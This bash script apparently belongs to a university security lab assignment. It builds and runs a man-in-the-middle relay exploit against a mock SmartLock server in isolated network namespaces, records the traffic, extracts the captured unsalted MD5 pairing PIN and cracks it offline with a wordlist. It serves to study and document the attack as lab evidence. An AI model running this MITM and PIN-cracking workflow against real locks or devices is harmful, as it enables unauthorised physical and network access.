#!/usr/bin/env bash
# Task 2 evidence capture: SmartLock v1 MITM impersonation (AES256-GCM) plus
# offline recovery of the unsalted MD5 pairing PIN.
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
SMARTLOCK_DIR="$LAB_DIR/smartlock"
EVIDENCE_DIR="$LAB_DIR/../23i-0614-G/evidence/taska2_mitm"
EXPLOIT_SRC="$LAB_DIR/../23i-0614-G/exploits/23i-0614-G-TASKA2-V1.cpp"
EXPLOIT_BIN="/tmp/exploit_taska2"
WORDLIST="$SMARTLOCK_DIR/pin_wordlist.txt"

mkdir -p "$EVIDENCE_DIR"

# 0. Build the exploit from the deliverables directory
echo "[+] Compiling TASKA2 exploit from $EXPLOIT_SRC..."
g++ -std=c++17 -O2 -Wall "$EXPLOIT_SRC" -o "$EXPLOIT_BIN" -lcrypto

# 1. Reset network
bash "$SCRIPT_DIR/net_setup.sh"

PORT=$(grep -E "^port\s*=" "$SMARTLOCK_DIR/instance.txt" | awk '{print $3}' | tr -d '\r')
PROXY_PORT=8000

echo "[+] Target Lock Port: $PORT"
echo "[+] Relay Listen Port: $PROXY_PORT"

killall lock_server 2>/dev/null || true
killall exploit_taska2 2>/dev/null || true
killall tcpdump 2>/dev/null || true

# 2. Start lock_server on VM1 (10.10.10.11)
echo "[+] Starting Lock Server on VM1 (10.10.10.11)..."
ip netns exec vm1_lock bash -c "cd '$SMARTLOCK_DIR' && exec ./lock_server instance.txt" \
    > /tmp/lock_taska2.log 2>&1 &
sleep 0.8

# 3. Capture both legs (hub<->relay loopback and relay<->lock veth)
PCAP_FILE="$EVIDENCE_DIR/taska2_mitm.pcap"
rm -f "$PCAP_FILE"
echo "[+] Starting packet capture to $PCAP_FILE..."
ip netns exec vm2_kali tcpdump -U -i any -w "$PCAP_FILE" \
    "tcp port $PORT or tcp port $PROXY_PORT" > /dev/null 2>&1 &
sleep 0.8

# 4. Start the TASKA2 MITM relay on VM2 (10.10.10.12)
OUTPUT_FILE="$EVIDENCE_DIR/taska2_output.txt"
HUB_OUTPUT="/tmp/hub_taska2.log"
echo "[+] Starting TASKA2 MITM relay on VM2..."
ip netns exec vm2_kali bash -c "exec '$EXPLOIT_BIN' $PROXY_PORT 10.10.10.11 $PORT '$WORDLIST'" \
    > "$OUTPUT_FILE" 2>&1 &
sleep 0.8

# 5. Run the legitimate hub against the relay. Keep its output in a separate
#    file so the two buffered writers cannot overwrite each other, then append
#    it to the evidence log once both sides have finished.
echo "[+] Running hub_client through the MITM relay (127.0.0.1:$PROXY_PORT)..."
set +e
ip netns exec vm2_kali bash -c "cd '$SMARTLOCK_DIR' && ./hub_client instance.txt 127.0.0.1 $PROXY_PORT" \
    > "$HUB_OUTPUT" 2>&1
set -e

sleep 1
killall -INT tcpdump 2>/dev/null || true
killall exploit_taska2 2>/dev/null || true
killall lock_server 2>/dev/null || true
sleep 0.5

{
    echo ""
    echo "============ HUB CLIENT OUTPUT (through MITM relay) ============"
    cat "$HUB_OUTPUT"
} >> "$OUTPUT_FILE"

echo "[+] Relay run complete. Captured output:"
cat "$OUTPUT_FILE"

echo "[+] PCAP file size:"
ls -lh "$PCAP_FILE"

# 6. Save the captured MD5 and run the offline cracker as separate evidence
PINHASH=$(grep -oE '\[PINHASH\] [0-9a-fA-F]{32}' "$OUTPUT_FILE" | head -n1 | awk '{print $2}' || true)
if [ -n "$PINHASH" ]; then
    echo "$PINHASH" > "$EVIDENCE_DIR/captured_pin.md5"
    echo "[+] Captured PIN hash: $PINHASH"
    echo "[+] Running offline PIN crack..."
    "$EXPLOIT_BIN" --crack "$PINHASH" "$WORDLIST" \
        > "$EVIDENCE_DIR/pin_crack_output.txt" 2>&1 || true
    cat "$EVIDENCE_DIR/pin_crack_output.txt"
else
    echo "[!] Could not extract pinhash from relay output."
fi

# 7. Export TCP stream transcripts
echo "[+] Exporting TCP stream transcripts..."
tshark -r "$PCAP_FILE" -z "follow,tcp,ascii,0" -q \
    > "$EVIDENCE_DIR/taska2_stream0.txt" 2>&1 || true
tshark -r "$PCAP_FILE" -z "follow,tcp,ascii,1" -q \
    > "$EVIDENCE_DIR/taska2_stream1.txt" 2>&1 || true

echo "[+] TASKA2 execution finished successfully."
